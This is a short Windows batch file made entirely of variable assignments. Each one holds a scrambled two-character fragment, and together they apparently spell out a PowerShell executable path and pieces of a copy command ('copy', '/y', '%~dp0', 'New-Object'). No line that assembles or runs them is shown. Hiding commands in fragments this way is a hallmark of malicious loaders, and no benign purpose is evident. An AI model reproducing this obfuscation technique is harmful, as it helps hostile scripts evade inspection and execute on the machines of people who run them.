@echo off
set "mqbAbgMQip=py"
set "FzEHHjVLdr=Sy"
set "SiKlhvaOSy=\v"
set "mRbOEfINMF=po"
set "YHqDIwyiEj=1."
set "otYTblucxs=he"
set "RhiSXKuhvk= C"
set "jifAYFvUNn=xe"
set "YKiKCUfUDO=Wi"
set "dvnKEuvDOL=st"
set "WxUccpRQqi=em"
set "ADuwEdVAHl=rs"
set "vPmjDVOuEC=0\"
set "wustBztyuz=:\"
set "VmEIxqaLeW=\W"
set "lFjZuisCcV=we"
set "MvJEghFCFr=in"
set "DlsJcJxFkB=.e"
set "PIfKsYLZGZ=ll"
set "DTfWBYQHOx=rS"
set "VDoFWRYHZB=ow"
set "DnzHqjwYkJ=nd"
set "pfLtwOpeaW=Po"
set "yILnIwnBnC=y "
set "rERhuqLJQs=co"
set "kYIhevZHXN=32"
set "vOFbPJTmEL=ws"
set "rfvUgeMgGi=do"
set "HFkplgFBYC=he"
set "NLwYYQFnPu=ll"
set "QwcGvQRKBs=we"
set "DQEzhPhvyN= /"
set "MnwIrhZxpd=s\"
set "FbdpslvYMY= %~dp0"
set "doXoozMadq=cd"
set "WNyFvwHWSK=Obje"
